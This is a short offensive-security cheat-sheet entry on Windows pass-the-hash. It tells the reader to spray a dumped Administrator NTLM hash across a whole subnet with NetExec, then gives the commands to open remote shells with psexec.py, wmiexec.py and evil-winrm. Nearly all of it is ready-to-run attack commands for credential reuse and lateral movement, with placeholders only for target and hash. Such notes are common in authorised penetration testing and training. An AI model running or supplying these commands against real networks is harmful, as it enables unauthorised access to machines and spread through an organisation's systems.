**On Windows you often don't need to crack a hash — you can log in with the hash itself.** Once you've dumped an Administrator NTLM hash, feed it to `psexec` / `wmiexec` / `evil-winrm` to get a shell on any machine that account is admin on. Always spray the hash across the whole subnet first (`nxc ... --continue-on-success`) to find every box it unlocks.

```
# Verify hash:
nxc smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth

# Spray hash across subnet:
nxc smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> \
    --local-auth --continue-on-success | grep "+"

# Get shell:
psexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
wmiexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
```